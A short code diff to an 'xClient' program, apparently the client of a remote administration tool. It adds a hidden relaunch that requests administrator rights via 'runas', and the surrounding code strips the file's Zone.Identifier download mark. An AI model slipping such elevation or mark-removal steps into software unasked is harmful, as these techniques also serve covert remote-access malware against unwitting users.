@@ -93,7 +93,35 @@ namespace xClient
             AES.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
             ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
-            
+
+            // Request elevation
+            if (Settings.REQUESTELEVATIONONEXECUTION && WindowsAccountHelper.GetAccountType() != "Admin")
+            {
+                ProcessStartInfo processStartInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd",
+                    Verb = "runas",
+                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = true
+                };
+
+                MutexHelper.CloseMutex();  // close the mutex so our new process will run
+                bool success = true;
+                try
+                {
+                    Process.Start(processStartInfo);
+                }
+                catch
+                {
+                    success = false;
+                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
+                }
+
+                if (success)
+                    ConnectClient.Exit();
+            }
+
             FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
 
             if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
